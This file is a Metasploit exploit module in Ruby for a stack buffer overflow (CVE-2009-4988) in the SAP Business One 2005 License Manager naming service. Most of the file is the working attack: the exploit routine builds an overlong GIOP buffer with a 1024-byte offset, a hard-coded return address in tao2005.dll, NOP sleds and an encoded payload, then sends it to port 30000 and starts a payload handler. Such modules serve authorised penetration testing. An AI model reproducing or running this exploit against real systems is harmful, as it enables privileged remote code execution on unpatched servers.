##
# $Id: sap_2005_license.rb 11180 2010-11-30 20:19:18Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SAP Business One License Manager 2005 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the SAP Business One 2005
					License Manager 'NT Naming Service' A and B releases. By sending an
					excessively long string the stack is overwritten enabling arbitrary
					code execution.
			},
			'Author'         => 'Jacopo Cervini',
			'Version'        => '$Revision: 11180 $',
			'References'     =>
				[
					[ 'OSVDB', '56837' ],
					[ 'CVE', '2009-4988' ],
					[ 'BID', '35933' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/9319' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# patrickw tested OK w2k3sp2 20090910
					[ 'Sap Business One 2005 B1 Universal', { 'Ret' => 0x00547b82 } ], # tao2005.dll push esp /ret
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 1 2009'))

			register_options([Opt::RPORT(30000)], self.class)

	end

	def exploit
		connect

		sploit =  "\x47\x49\x4f\x50\x01\x00\x01\x00" + rand_text_english(1024)
		sploit << [target.ret].pack('V') # EIP for w2k3sp2 - jacopo (1024)
		sploit << [target.ret].pack('V') # EIP for w2k3sp0 - patrickw (1028)
		sploit << make_nops(44) + payload.encoded + make_nops(384)

		print_status("Trying target #{target.name}...")
		sock.put(sploit)
		select(nil,nil,nil,1)

		handler
		disconnect
	end

end